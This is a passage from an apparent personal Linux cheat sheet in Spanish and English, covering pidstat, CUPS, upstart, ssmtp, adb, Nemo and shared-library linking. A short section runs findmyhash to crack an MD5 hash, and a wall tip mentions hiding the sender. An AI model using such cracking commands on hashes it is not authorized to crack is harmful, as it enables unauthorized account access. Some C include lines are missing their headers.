05:00:03            7    0.00    0.00    0.00    0.00     0  watchdog/0
05:00:03            8    0.00    0.00    0.00    0.00     0  cpuset
05:00:03            9    0.00    0.00    0.00    0.00     0  khelper

Use -p PID to monitor performance statistics for a particular process as shown below.

# pidstat -p 13203
Linux 3.0.101-0.7.17-default (thegeekstuff)    07/30/14        _x86_64_

05:04:29          PID    %usr %system  %guest    %CPU   CPU  Command
05:04:29        13203    0.00    0.00    0.00    0.00     0  vim

If you are new to systat package, you should also understand the performance statistics data provided by sar command.


# 2. Display Performance Statistics based on Process Name using -C #

The following example will display performance statistics for all the process that matches a specific keyword (for example: mysql).

# pidstat -C "mysql"
Linux 3.0.101-0.7.17-default (thegeekstuff)    07/30/14        _x86_64_

06:33:14          PID    %usr %system  %guest    %CPU   CPU  Command
06:33:14        23132    0.00    0.00    0.00    0.00     0  mysqld_safe
06:33:14        23493    0.06    0.02    0.00    0.08     0  mysqld

Note: In the above example, the option -C stands for "Command Name". i.e It will search the command name of the process with the given keyword.


# 3. Repeat the Output at Certain Interval #

By default, the OUTPUT will not be repeated. For example, option -u is to display the CPU usage statistics of tasks and this is the default statistics given by pidstat command. Thsi will display the OUTPUT only one time.

# pidstat -p 23493
Linux 3.0.101-0.7.17-default (thegeekstuff)    07/30/14        _x86_64_

06:52:35          PID    %usr %system  %guest    %CPU   CPU  Command
06:52:36        23493    1.00    0.00    0.00    1.00     0  mysqld

To repeat the OUTPUT, specific the interval in seconds as the last parameter. For example, the following example will repeat the OUTPUT every 1 second (until you press Ctrl-C).

# pidstat -p 23493 1
Linux 3.0.101-0.7.17-default (thegeekstuff)    07/30/14        _x86_64_

06:52:35          PID    %usr %system  %guest    %CPU   CPU  Command
06:52:36        23493    1.00    0.00    0.00    1.00     0  mysqld
06:52:37        23493    0.00    0.00    0.00    0.00     0  mysqld
06:52:38        23493    0.00    0.00    0.00    0.00     0  mysqld
06:52:39        23493    0.00    0.00    0.00    0.00     0  mysqld
06:52:40        23493    0.00    0.00    0.00    0.00     0  mysqld
06:52:41        23493    0.00    0.00    0.00    0.00     0  mysqld
..

The following will repeat the OUTPUT every 5 seconds (until you press Ctrl-C).

# pidstat -p 23493 5


# 4. Display I/O Statistics for a Specific Process using -d #

Use option -d to report I/O statistics of process. It OUTPUT displays different attributes like PID, disk read and write speed in kB/s as shown below.

The following example displays the disk usage for PID 23493 every 1 second.

# pidstat -p 23493 -d 1
Linux 3.0.101-0.7.17-default (thegeekstuff)    07/30/14        _x86_64_

06:48:33          PID   kB_rd/s   kB_wr/s kB_ccwr/s  Command
06:48:34        23493      0.00      0.00      0.00  mysqld
06:48:35        23493      0.00      0.00      0.00  mysqld
06:48:36        23493      0.00      0.00      0.00  mysqld
06:48:37        23493      0.00      0.00      0.00  mysqld
06:48:38        23493      0.00      0.00      0.00  mysqld
06:48:39        23493      0.00      0.00      0.00  mysqld
06:48:40        23493      0.00      0.00      0.00  mysqld
06:48:41        23493      0.00      0.00      0.00  mysqld


# 5. Display Paging Activity for a Specific Process using -r #

Use option -r to display page faults and memory utilization for a given task (PID).

# pidstat -p 23493 -r 1
Linux 3.0.101-0.7.17-default (thegeekstuff)    07/30/14        _x86_64_

06:58:48          PID  minflt/s  majflt/s     VSZ    RSS   %MEM  Command
06:58:49        23493      0.00      0.00  398876  33468   3.28  mysqld
06:58:50        23493      0.00      0.00  398876  33468   3.28  mysqld
06:58:51        23493      0.00      0.00  398876  33468   3.28  mysqld
06:58:52        23493      0.00      0.00  398876  33468   3.28  mysqld
06:58:53        23493      0.00      0.00  398876  33468   3.28  mysqld
06:58:54        23493      0.00      0.00  398876  33468   3.28  mysqld
06:58:55        23493      0.00      0.00  398876  33468   3.28  mysqld


# 6. Display Command Name and its Arguments using option -l #

By default, pidstat displays only the command name. i.e Without the full path of the command and its argument. For example, in the command column you'll see only "java" (which is just the name of the program).

$ pidstat -C java
Linux 3.0.101-0.7.17-default (thegeekstuff)    07/30/14        _x86_64_

11:00:25       PID    %usr %system  %guest    %CPU   CPU  Command
11:00:25      3288    0.04    0.03    0.00    0.07     0  java
11:00:25     17861    0.03    0.02    0.00    0.05     6  java

However when you use option -l, it will display the full path of the command, and all its arguments as shown below.

$ pidstat -C java -l
Linux 3.0.101-0.7.17-default (thegeekstuff)    07/30/14        _x86_64_

11:00:31       PID    %usr %system  %guest    %CPU   CPU  Command
11:00:31      3288    0.04    0.03    0.00    0.07     0  /usr/bin/java -Djava.util.logging.config.file=/home/tomcat/apache-tomcat-7.0.56/conf/logging.properties
11:00:31     17861    0.03    0.02    0.00    0.05     6  java -jar /home/rabbit/myapp.jar /home/app/conf/myapp.conf

In order to get the statistics on regular intervals for tasks, just pass the number of seconds at which you wish to see the statistics,

# pidstat -p 23493 1
Linux 3.0.101-0.7.17-default (thegeekstuff)    07/30/14        _x86_64_

06:25:50          PID    %usr %system  %guest    %CPU   CPU  Command
06:25:51        23493    0.00    0.00    0.00    0.00     0  mysqld
06:25:52        23493    0.00    0.00    0.00    0.00     0  mysqld

As seen above, watching the mysqld process's statistics for every 1 second.

You can also fetch few process ids from top command OUTPUT and watch it here to understand its usage of system resources on regular intervals.


# 7. Display Output at Regular Intervals for X Number of Times #

It is also possible to get reports for certain number of times at given intervals for list of process as shown below.

Add the number of times as the last parameter (after the intervals in seconds).

For example, the following will display the OUTPUT 5 times (at a regular interval of 2 seconds). At the end of the report, it will also display the "Average" values.

# pidstat 2 5
Linux 3.0.101-0.7.17-default (thegeekstuff)    07/30/14        _x86_64_

07:14:11          PID    %usr %system  %guest    %CPU   CPU  Command
07:14:13         1445    0.00    0.50    0.00    0.50     0  pidstat
07:14:13        28222    0.50    0.00    0.00    0.50     0  cma

07:14:13          PID    %usr %system  %guest    %CPU   CPU  Command
07:14:15         1445    0.00    0.50    0.00    0.50     0  pidstat
07:14:15        28222    0.00    0.50    0.00    0.50     0  cma

07:14:15          PID    %usr %system  %guest    %CPU   CPU  Command
07:14:17         1445    0.50    0.00    0.00    0.50     0  pidstat
07:14:17        19614    0.00    0.50    0.00    0.50     0  nailswebd

07:14:17          PID    %usr %system  %guest    %CPU   CPU  Command
07:14:19         1445    0.50    0.50    0.00    1.00     0  pidstat

07:14:19          PID    %usr %system  %guest    %CPU   CPU  Command
07:14:21         1445    0.00    0.51    0.00    0.51     0  pidstat
07:14:21        28222    0.00    0.51    0.00    0.51     0  cma

Average:          PID    %usr %system  %guest    %CPU   CPU  Command
Average:         1445    0.20    0.40    0.00    0.60     -  pidstat
Average:        19614    0.00    0.10    0.00    0.10     -  nailswebd
Average:        28222    0.10    0.20    0.00    0.30     -  cma


# 8. Display Statistics of Selected Process and its Child using -T #

Use option -T to specify either CHILD or TASKS. In this case the statistics will be reported for TASKS, or tasks and all their children. You can also specify ALL.

Possible values for -T: CHILD, or TASKS, or ALL.

# pidstat -T CHILD | head 
Linux 3.0.101-0.7.17-default (thegeekstuff)    07/30/14        _x86_64_

10:13:34  IST       PID    usr-ms system-ms  guest-ms  Command
10:13:34  IST         1      7950      3340         0  init
10:13:34  IST         3         0       420         0  ksoftirqd/0
10:13:34  IST         8         0        10         0  migration/0
10:13:34  IST        10         0      1190         0  rcu_sched
10:13:34  IST        11        10         0         0  watchdog/0
10:13:34  IST        12        10         0         0  watchdog/1
10:13:34  IST        13         0       450         0  ksoftirqd/1


# 9. Display Statistics of Dependent Process in Tree Format using -t #

Using option -t, you can display the OUTPUT in a tree format as shown below.

# pidstat -t -C "mysql"
Linux 3.0.101-0.7.17-default (thegeekstuff)    07/30/14        _x86_64_

18:47:54          PID       TID    %usr %system  %guest    %CPU   CPU  Command
18:47:54         1646        -     0.00    0.00    0.00    0.00     0  mysql
18:47:54           -       1646    0.00    0.00    0.00    0.00     0  |__mysql
18:47:54        23132        -     0.00    0.00    0.00    0.00     0  mysqld_safe
18:47:54           -      23132    0.00    0.00    0.00    0.00     0  |__mysqld_safe
18:47:54        23493        -     0.06    0.02    0.00    0.08     0  mysqld
18:47:54           -      23493    0.00    0.00    0.00    0.00     0  |__mysqld
18:47:54           -      23504    0.00    0.00    0.00    0.00     0  |__mysqld
18:47:54           -      23509    0.00    0.00    0.00    0.00     0  |__mysqld
18:47:54           -      23510    0.00    0.00    0.00    0.00     0  |__mysqld
18:47:54           -      23512    0.00    0.00    0.00    0.00     0  |__mysqld
18:47:54           -      23515    0.00    0.00    0.00    0.00     0  |__mysqld
18:47:54           -      23516    0.01    0.00    0.00    0.02     0  |__mysqld
18:47:54           -      23517    0.00    0.00    0.00    0.00     0  |__mysqld
18:47:54           -      23518    0.01    0.01    0.00    0.02     0  |__mysqld
18:47:54           -      23519    0.00    0.00    0.00    0.00     0  |__mysqld
..


# 10. Display All Statistics Horizontally on a Single Line using -h #

If you ask pidstat to report more than one statistics it displays one statistics after another statistics. In the following example, it will first display the performance statistics for option "r", then option "u", and finally option "d".

# pidstat -rud

However if you want all of those statistics to be displayed in a single line for the individual process, use the option -h as shown below.

# pidstat -rud -h | head
Linux 3.0.101-0.7.17-default (thegeekstuff)    07/30/14        _x86_64_

#      Time       PID    %usr %system  %guest    %CPU   CPU  minflt/s  majflt/s     VSZ    RSS   %MEM   kB_rd/s   kB_wr/s kB_ccwr/s  Command
 1406823329         1    0.04    0.19    0.00    0.24     2     21.50      0.03   26944   2768   0.07     -1.00     -1.00     -1.00  init
 1406823329         3    0.00    0.03    0.00    0.03     0      0.00      0.00       0      0   0.00     -1.00     -1.00     -1.00  ksoftirqd/0
 1406823329         8    0.00    0.00    0.00    0.00     0      0.00      0.00       0      0   0.00     -1.00     -1.00     -1.00  migration/0
 1406823329        10    0.00    0.08    0.00    0.08     2      0.00      0.00       0      0   0.00     -1.00     -1.00     -1.00  rcu_sched
 1406823329        13    0.00    0.03    0.00    0.03     1      0.00      0.00       0      0   0.00     -1.00     -1.00     -1.00  ksoftirqd/1
 1406823329        14    0.00    0.00    0.00    0.00     1      0.00      0.00       0      0   0.00     -1.00     -1.00     -1.00  migration/1
 1406823329        18    0.00    0.01    0.00    0.01     2      0.00      0.00 

#############################################################################################################################################################################################

########################################################################################## speedtest ########################################################################################

#### speedtest

# instalacion #

sudo apt-get install python-pip

sudo pip install speedtest-cli

# sintaxis basica #

sudo speedtest-cli

# generar crear una imagen en base al resultado #

sudo speedtest-cli --share

# ver una lista de servers #

sudo speedtest-cli --list

# testear la velosidad especificando un server en concreto #

sudo speedtest-cli --server 3505


#############################################################################################################################################################################################

############################################################################################ upstart ########################################################################################

#### upstart


# comando para configurar el inicio de un servicio en modo manual, o sea para que no se inicie automaticamente al inicio del sistema #

sudo sh -c "echo 'manual' > /etc/init/SERVICE.override"

# where the stanza manual will stop Upstart from automatically loading the service on next boot. Any service with the .override ending will take precedence over the original service file. You will only be able to start the service manually afterwards. If you do not want this then simply delete the .override. For example: #

# sudo sh -c "echo 'manual' > /etc/init/mysql.override" #

# Will put the MySQL service into "manual" mode. If you do not want this, afterwards you can simply do #

sudo rm /etc/init/mysql.override

# and Reboot for the service to start automatically again. #


# notas #

There are other commands like initctl which can do nice things like list all services with the status for each of them: initctl list. It can also start, stop, restart a job as many other options found when you execute initctl help.

Upstart in the future will include options that could replace cron. For example, creating a timed based starting/stopping of services in a very user friendly way. A good guide is found here as the cookbook for upstart: http://upstart.ubuntu.com/cookbook/


############################################################################################# cups ##########################################################################################

#### cups

#### Configurar cups como servidor de impresion ####

# El titulo de este post, en realidad, no es de lo mas acertado porque cups siempre trabaja como servidor de impresion, aunque por defecto viene configurado para escuchar en localhost:631, y, por lo tanto tan solo configura la impresora para la maquina local. ?Como? Con una linea en el fichero de configuracion /etc/cups/cupsd.conf como la siguiente: #

Listen localhost:631

# Para cambiar este comportamiento, podemos modificar la linea anterior de tal manera que, en lugar de localhost, especifique la direccion IP de la maquina. Por ejemplo, si el equipo que comparte la impresora tiene la IP 172.19.144.240:  #

Listen 172.19.144.240:631

De este modo, cualquier maquina de nuestra red, podra imprimir en la/s impresora/s conectada/s a este servidor.

# Ahora bien, supongamos que estamos utilizando una maquina que queremos usar como servidor de impresion en dos redes a las que tiene conexion mediante dos interfaces de red con direcciones IP 172.19.144.240 y 192.168.0.240. Para hacer que el servidor de impresion escuche en ambas interfaces, tan solo tenemos que anadir una linea por cada interfaz: #

Listen 172.19.144.240:631
Listen 192.168.0.240:631

# Por supuesto, siempre que hagais cambios en el fichero de configuracion, debereis reiniciar el servicio: #

service cups restart


#### Anadir nuevos "drivers" de impresoras a cups ####

El servidor de impresion CUPS (Common Unix Printing System) utiliza archivos PPD (PostScript Printer Description), un estandar desarrollado por Adobe, para realizar la impresion. Cuando configuramos una impresora le asociamos un archivo PPD. Ese archivo PPD contiene el codigo PostScript necesario para usar las caracteristicas de la impresora, de manera que funciona como un controlador de dispositivo.

# Normalmente, cuando configuramos impresoras en Linux, utilizamos los archivos ppd que nos proporciona el sistema, pero, en ocasiones, necesitamos instalar un driver especifico proporcionado por el fabricante o descargado por nosotros desde la web. En este caso, para que los archivos ppd que anadamos se encuentren disponibles en la lista de drivers a la hora de instalar una nueva impresora, los copiaremos al siguiente directorio de cups: #

/usr/share/ppd/custom


# Y si el driver que queremos anadir incorpora tambien algun filtro, lo colocaremos en el siguiente directorio de cups: #

/usr/lib/cups/filter


#### al instalar drivers de impresoras es recomendable descargar los drivers que proporciona el fabricante de la impresora desde su pagina oficial en internet, de no tener drivers para linux, podemos buscar los drivers o saber si nuestra impresora esta soportada en esta pagina: ####

http://www.openprinting.org/printers


#############################################################################################################################################################################################

########################################################################################### hash ############################################################################################

#### hash

# identificar hash #

python Hash_ID_v1.1.py

# intentar crackear un hash #

python findmyhash_v1.1.2.py MD5 -h 3f3ce8d94f88d42322e7204f702c138f


#############################################################################################################################################################################################

######################################################################################### safecopy ##########################################################################################

#### safecopy: recuperar infornacuib datos, de discos duros o cds dvds pendrives danados con sectores defectuosos - recover data from corrupt media

cool_penguin_smallHard disk or CD with important information gone bad? You might still be able to recover readable data using the low-level rescue tool safecopy. It’s a utility similar to GNU ddrescue.

safecopy does not fail where other tools (like cat or cp) fail on encountering an I/O error. It uses low level IO to read media in raw mode as well as direct hardware access with O_DIRECT instead of making calls through the virtual filesystem. In addition it issues device resets and other helpful low level operations.

Users can force continue a previous safecopy run at arbitrary position. It can keep trying to open source files even when they went away. This allows copying from devices that vanish temporarily in case of errors, like USB drives that renumerate in case of device resets.

From the developer notes: internally safecopy does this by identifying and skipping problematic or damaged areas, and continuing reading afterwards. The corresponding area in the destination file is either skipped (on initial creation that means padded with zeros) or deliberately filled with a recognizable pattern to later find affected files on a corrupted device. safecopy uses an incremental algorithm to identify the exact beginning and end of bad areas, allowing the user to trade minimum accesses to bad areas for thorough data resurrection. Multiple passes over the same file are possible, to first retrieve as much data from a device as possible with minimum harm, and then trying to retrieve some of the remaining data with increasingly aggressive read attempts.

safecopy can generate data to simulate a corrupt media. This data can be used to benchmark safecopy against similar data recovery tools.

# INSTALLATION: To install safecopy on Ubuntu: #

$ sudo apt-get install safecopy


# USAGE #

The best place to get help on safecopy is the manpages. A few common usecases:

# Resurrect a file from a mounted but damaged media, that cp failed on: #
$ safecopy /path/to/problemfile ~/saved-file


# Create a filesystem image of a damaged disk/cdrom: #
$ safecopy /dev/device ~/diskimage


# Interrupt and later resume a data rescue operation: #
$ safecopy source dest
<CTRL+C> (safecopy aborts)
$ safecopy source dest -I /dev/null


# Find the corrupted files on a partially successful rescued file system: #
$ safecopy /dev/filesystem image -M CoRrUpTeD
$ fsck image
$ mount -o loop image /mnt/mountpoint
$ grep -R /mnt/mountpoint "CoRrUpTeD"


# Create an image of a device that starts at X and is Y in size: #
$ safecopy /dev/filesystem -b <bsize> -s <X/bsize> -l <Y/bsize>

#############################################################################################################################################################################################

########################################################################################### moreutils #######################################################################################

#### moreutils

# moreutils is a growing collection of the unix tools that nobody thought to write long ago when unix was young #

# install #

sudo apt-get install moreutils

# What's included: #

Probably the most general purpose tool in moreutils so far is sponge(1), which lets you do things like this:

% sed "s/root/toor/" /etc/passwd | grep -v joey | sponge /etc/passwd
There are lots more listed below, and I'm always interested to add more to the collection, as long as they're suitably general-purpose, and don't duplicate other well-known tools.

chronic: runs a command quietly unless it fails

combine: combine the lines in two files using boolean operations

ifdata: get network interface info without parsing ifconfig output

ifne: run a program if the standard input is not empty

isutf8: check if a file or standard input is utf-8

lckdo: execute a program with a lock held

mispipe: pipe two commands, returning the exit status of the first

parallel: run multiple jobs at once

pee: tee standard input to pipes

sponge: soak up standard input and write to a file

ts: timestamp standard input

vidir: edit a directory in your text editor

vipe: insert a text editor into a pipe

zrun: automatically uncompress arguments to command

#############################################################################################################################################################################################

########################################################################################## wall #############################################################################################

#### wall

#### wall nos sirve para enviar un mensaje que sera visto en la terminal todos los usuarios logeados en el sistema operativo y que esten logeados en su terminal ####

# Here is a more useful example, this shows how to alert your users of upcoming server maintenance. #

sudo echo "The server will be rebooting in aproximately 15 minutes, please save your work." | wall

# If you use the -n parameter to the wall command, you can hide your identity. This could be fun… You must be root to use the nobanner option though. #

sudo echo "Hello" | wall -n

#############################################################################################################################################################################################

########################################################################################## ssmtp ############################################################################################

#### ssmtp

#### ssmtp es una interesante herramienta que nos va a permitir enviar correos desde la línea de comandos utilizando como servidor smtp una cuenta externa, como por ejemplo gmail. no recive mails ####

# En mi caso, como administrador de dominio de "gogle apps", he creado una cuenta que uso específicamente para remitir mensajes que me informen acerca del estado del sistema. #

# Lo primero, como siempre, será instalar la herramienta: #

sudo apt-get install ssmtp

# Una vez instalada, guardamos el archivo de configuración original: #

mv /etc/ssmtp/ssmtp.conf /etc/ssmtp/ssmtp.conf.orig

# Y creamos uno nuevo: #

touch /etc/ssmtp/ssmtp.conf

# Al que añadimos un contenido similar al siguiente: #

# Cuenta de correo que va a recibir todos los correos
root=sysinfo@gmail.com

# Servidor SMTP al que reenviaremos los correos
mailhub=smtp.gmail.com:587

# Datos de autenticación de la cuenta de correo
AuthUser=sysinfo@gmail.com
AuthPass=passwordDelUsuario

# Usar SSL/TLS
UseTLS=Yes
UseSTARTTLS=Yes

# Nombre de Dominio a mostrar como enviador del correo
rewriteDomain=iesvalledeljerteplasencia.es

# Nombre del host
hostname=recursos


# En este fichero, debéis sustituir las direcciones de correo y la contraseña por vuestros propios datos. #

# Una vez hecho ésto, cambiamos los permisos del fichero /etc/ssmtp/ssmtp.conf para que otros usuarios no puedan ver la contraseña de correo: #

chmod 640 /etc/ssmtp/ssmtp.conf

# Y asignamos como propietario root y grupo mail #

chown root:mail /etc/ssmtp/ssmtp.conf

# Aunque principalmente usemos ssmtp con la cuenta de correo del administrador, de este modo, todos aquellos usuarios que añadamos al grupo mail también podrán enviar correos. Para comprobar que funciona, podéis enviar un mensaje de prueba a una cuenta de correo externa: #

echo "esto es un mensaje de prueba" | mail -s Prueba algodelinux@gmail.com

Y si todo ha ido bien, recibiréis el mensaje en la cuenta especificada

#############################################################################################################################################################################################

######################################################################################### jdownloader #######################################################################################

#### jdownloader

The running instance of JD can be controlled using a second terminal window in which pre-defined commands can be entered using the same executable as used to start the application. Eg:

    JDownloader -pause
    JDownloader -continue
    JDownloader -stop
    JDownloader -start
    JDownloader -update
    JDownloader -speed
    JDownloader -maxcon <maxNumConn>
    JDownloader -speed <speed>
    JDownloader -maxDls <maxDls>
    JDownloader -addwatch <folderLocation>
    JDownloader -remwatch <folderLocation>
    JDownloader -add <link>
    JDownloader -remove <packageName>
    JDownloader -order <packageName> <newPosistionInQueue>
    JDownloader -queueFirst <packageName>
    JDownloader -queueLast <packageName>
    JDownloader -force <packageName>
    JDownloader -quit

#############################################################################################################################################################################################

########################################################################################## android ##########################################################################################

#### android

#### how to hard reset your atrix

1. Power off the phone, press and hold volume down button, press power button.
2. Screen will come up with "Fastboot", press Vol down key to cycle through choices until you get "Android Recovery", then press Vol up key
3. Wait for the "triangle ! / Android" screen then go on to step 4
4. Tap on bottom right corner of the screen (may take a few times). a menu will come up
5. Tap on "wipe data/factory reset", and tap OK. Another Confirmation screen will come. Tap Yes and OK
6. After userdata is cleared, the "reboot system now" option will be highlighted by Default. Tap OK.
7. Phone will reboot to initial setup MOTOBLUR screen. 

#### instalar utilidades para trabajar con android ####

sudo apt-get install android-tools-adb android-tools-fastboot android-tools-fsutils

#### para poder interactuar con nuestro android enviandole comandos desde nuestra pc tenemos que activar la opcion de desarrollo una vez que lo conectamos mediante usb y el modo debug. Una vez conectado, podemos abrir un shell y comprobar si adb detecta nuestro smartphone ####

adb devices

# Si lo detecta, veréis una salida similar a la siguiente: #

List of devices attached 
0160741711004023 device

# A partir de ahí, ya podemos ejecutar comandos en nuestro smartphone, transferirle archivos, descargar archivos, etc desde la línea de comandos. #

#############################################################################################################################################################################################

###################################################################################### nautilus nemo ########################################################################################

#### nautilus #### nemo

# Set Nemo As Default File Manager #

xdg-mime default nemo.desktop inode/directory application/x-gnome-saved-search


# to revert this enter #

xdg-mime default nautilus.desktop inode/directory application/x-gnome-saved-search


# Now Nemo (nemo.desktop app launcher to be exact) should be the default file manager (folder handler). To test the result, run this command: #### 

xdg-open $HOME   - That command should launch Nemo showing your home directory


# Set Nemo To Handle Desktop #

In Ubuntu, Nautilus is set to handle desktop by default (to manage desktop icons, menu, etc), and if you have Nemo installed, there will be a conflict, both will be automatically loaded every time you logging in, to take control of the desktop.

If you want to stop Nautilus from handling the desktop and want to set Nemo instead, you can do the followings:


# Disable desktop handling by Nautilus #

gsettings set org.gnome.desktop.background show-desktop-icons false

gsettings set org.nemo.desktop show-desktop-icons true

# To revert this run #

gsettings set org.nemo.desktop show-desktop-icons false

gsettings set org.gnome.desktop.background show-desktop-icons true


# In short #

# Install Nemo from its cinnamon ppa. Then in a terminal make it default for opening files: #

xdg-mime default nemo.desktop inode/directory application/x-gnome-saved-search   - Now it's the default for opening files.


# But, handling the desktop? I can disable Nautilus with: #

gsettings set org.gnome.desktop.background show-desktop-icons false


After disabling Nautilus I started gnome-tweak-tool & enabled "Have file manager handle the desktop". Now it's Nemo!

#############################################################################################################################################################################################

################################################################################## static and dynamic libraries #############################################################################

# Static and Dynamic Libraries on Linux #

# A Quickstart Guide #

We’re going to look at how to create and use libraries on Linux and try to gain some insight on how libraries work behind the scenes.
Decisions Decisions!

Often when working with 3rd party code you may be limited on the options available. Some well known open-source projects have dual-licensed binaries that dictate different terms for static or dynamic linking.

Writing a library is a good way to provide an interface to customers, get code reuse and can be a major source of headaches!. To understand what’s best for your usecase it’s worth looking at what each type provides.
Static libraries (.a files) are precompiled object code which is linked into other executables at compile time and become part of that final application. These libraries load quickly, have less indirection and don’t run the risk of dependency hell which can beset their dynamic peers.


# Library #

Static libraries incur an overhead of space and memory whenever they are used due to their nature of being part of the executable but, due to their inclusion at build time, unused code can be optimised out.
On the downside, if you want to upgrade a part of your interface you will need to ask all your customers to rebuild their executables against the updated library whereas dynamic libraries push this to a load/runtime issue.

Dynamically linked shared object libraries (.so files) work alongside the link loader to allow external symbols referenced in executables to be resolved at load time and can be used in one of two ways:

    Loaded in at run time by the linker and must be available for compile/link phase for symbol checking.
    Dynamically loaded by dlopen() – used by plugins and on-demand situations.

Using dynamic linking is encouraged on Linux systems to reduce the number of copies of code and allow management of the different libraries (often by a package manager on Linux).

To illustrate some of our later points and to make it clear what’s happening we’ll use the trivial code snippets as follows:

/* lib1.c */
#include 
void f1()
{
  printf("In library 1\n");
}

/* main.c */
#include 
void f1();
void main()
{
  f1();
  printf("In main\n");
}

Only our main.c will have the main function as this is our C program’s entry point. Regardless of how many libraries we have otherwise you’ll see the error:

	 multiple definition of `main' when you link.


# Static Libraries #

Static libraries are object files that are later combined with another object to form a final executable. By convention they have the prefix lib and the suffix .a – for example, libpthread.a

To create a static library using GCC we need to compile our library code into an object file so we tell GCC to do this using -static and -c

	$ gcc -static -c -o lib1.o lib1.c

Once we have an object file (or files! we could have many we wish to combine into a single library) we use the GNU ar command to create our final library/archive

	$ ar rcs libfoo.a lib1.o lib2.o

This tells ar to create an archive (c), insert the objects, replacing older files where needed (r) and to write out an index (s).

To use this library in future executables you use something like the following:

	$ gcc main.c -o test -lfoo
	$ ./test
	In library 1
	In main

Note how the lib prefix and .a suffix are omitted. If you had the library files outside of the standard library search path (we’ll talk about this later) you could use -L /path/to/other/libs to make the linker aware.


# Dynamic Libraries #

Dynamic libraries are slightly more interesting from the perspective of symbol resolution and actual loading so we’ll look at that once we have some binaries to work with.
Dynamic, or shared, libraries have the same lib prefix as static libraries but the suffix becomes .so indicating they are shared objects.

	$ gcc -shared -fPIC -o lib1.so lib1.c

The -shared is used to indicate it’s a shared object and the -fPIC is used to tell GCC to produce position independent code. The concept of position independent code is fundamental for dynamic libraries as they could be loaded into memory at any location so things like jumps in code are alterered to use relative offsetting rather than absolute.

To link against our library lib1.so we could use the following snippet, again we omit the suffix and lib prefix.

	$ gcc -L$(pwd) -o test main.c -l1

The $(pwd) expansion simply allows the linker to search the current working directory for the shared object library.
This probably won’t result in a runnable executable off the bat though…

	$ ./test 
	./test: error while loading shared libraries: lib1.so: 
	cannot open shared object file: No such file or directory

Let’s look at why this doesn’t quite work and learn more about what happens behind the scenes!
The role of ld-linux.so

Linux uses ELF binaries for executables, libraries and coredumps and has done so since around 1999 – Modern systems use the application /lib/ld-linux.so.2 to locate, load and map all the necessary dynamic libraries into your applications address space on behalf of your executable.

ld-linux.so.2 will search for library files in the following ways:

    Using the directories specified in DT_RPATH (unless DT_RUNPATH is specified)
    Search the enviromental path LD_LIBRARY_PATH for library locations
    Using the directories specified as DT_RUNPATH in the dynamic section of the binary if present. (see The One True Path section later).
    From information in the cache file /etc/ld.so.cache which is generated by ldconfig and the contents of /etc/ld.so.conf and /etc/ld.so.conf.d/*
    Searching the default path of /lib and /usr/lib (unless you do something crazy like using -z nodeflib to prevent default library usage)

To find out which libraries your program depends on we can use the tool readelf, which is provided as part of the binutils package, to examine the dynamic section of the binary using the -d/–dynamic flag.

	$ readelf -d test
	Dynamic section at offset 0xf0c contains 25 entries:
	Tag Type Name/Value
	0x00000001 (NEEDED) Shared library: [lib1.so]
	0x00000001 (NEEDED) Shared library: [libc.so.6]
	0x0000000c (INIT) 0x80483f0
	0x0000000d (FINI) 0x8048614
	0x00000019 (INIT_ARRAY) 0x8049f00
	0x0000001b (INIT_ARRAYSZ) 4 (bytes)

We can see that our library depends on libc and our library lib1.so. We can use the -l/–segment flag to examine the segment headers to see our binaries call out to the link loader:

	$ readelf -l test
	Elf file type is EXEC (Executable file)
	Entry point 0x8048470
	There are 9 program headers, starting at offset 52
	Program Headers:
	Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align
	PHDR 0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
	INTERP 0x000154 0x08048154 0x08048154 0x00013 0x00013 R 0x1
	[Requesting program interpreter: /lib/ld-linux.so.2]
	LOAD 0x000000 0x08048000 0x08048000 0x00718 0x00718 R E 0x1000
	LOAD 0x000f00 0x08049f00 0x08049f00 0x00120 0x00124 RW 0x1000
	DYNAMIC 0x000f0c 0x08049f0c 0x08049f0c 0x000f0 0x000f0 RW 0x4
	...

If we’re really curious we can dig deeper and use the -r/–relocs flag to examine the relocation section of our binary. We can use this to find out what functions need to be provided to the executable to function correctly; libc.so provides most of the requests in this table but we can see our call out to f1 which is why we’re seeing that error.

	$ readelf -r test
	Relocation section '.rel.dyn' at offset 0x3c8 contains 1 entries:
	Offset Info Type Sym.Value Sym. Name
	08049ffc 00000306 R_386_GLOB_DAT 00000000 __gmon_start__
	Relocation section '.rel.plt' at offset 0x3d0 contains 4 entries:
	Offset Info Type Sym.Value Sym. Name
	0804a00c 00000207 R_386_JUMP_SLOT 00000000 puts
	0804a010 00000307 R_386_JUMP_SLOT 00000000 __gmon_start__
	0804a014 00000407 R_386_JUMP_SLOT 00000000 f1
	0804a018 00000507 R_386_JUMP_SLOT 00000000 __libc_start_main

So as expected, everything has worked and our library is being requested but it’s not currently being found. The easy way to test your project works is simply to override the LD_LIBRARY_PATH to point it to our libraries, a dot (.) will suffice to include the present working directory:

	$ LD_LIBRARY_PATH=”.” ./test
	In library 1
	In main

At this point you would typically package up your library to install to /lib or /usr/lib and voila or add the entry to the files under /etc/ld.so.conf.d/ and run ldconfig to regenerate the cache based on your new settings. If you’re doing things “properly” then that’s pretty much the end of your journey. Congratulations! However, it’s never quite that simple…
The One True path

There are times in shipping software where you need to deviate a little from the standard, perhaps you want to ship a self-contained package that doesn’t depend on ldconfig or ensure your provided library gets used before the system tries to locate it elsewhere; To that end we can leverage something called the runpath and rpath.
rpath vs runpath

When DT_RPATH was introduced as a concept, you’ll note from the list above that it has precedence over all other options.

This made it impossible to override the libraries search path so the powers that be decided to implement a newer parameter known as DT_RUNPATH which has lower precedence than LD_LIBRARY_PATH and as such, you can override the former with the latter.

rpath and runpath are conceptually the same thing, a list of alternate locations embedded within the executable that will be searched by the linker at runtime; Lacking a runpath, the older rpath will be used.

To specify both a rpath and runpath, you must tell the linker, using -Wl,-rpath=/my/location, the list of alternate locations and should also specify --enable-new-dtags. This last parameter causes it to embed the value as the runpath, and rpath, as only the rpath is used by default which causes the no-override problem mentioned above.

	$ gcc -L$(pwd) -Wl,-rpath=$(pwd) --enable-new-dtags -o test main.c -l1 -l2

To view the embedded paths we can use trusty old readelf again to examine the dynamic section of our binary and verify they match expectations:

	$ readelf -d test
	Dynamic section at offset 0xefc contains 27 entries:
	  Tag        Type                         Name/Value
	 0x00000001 (NEEDED)                     Shared library: [lib1.so]
	 0x00000001 (NEEDED)                     Shared library: [lib2.so]
	 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
	 0x0000000f (RPATH)                      Library rpath: [/home/nick/Development/libraryTutorial]
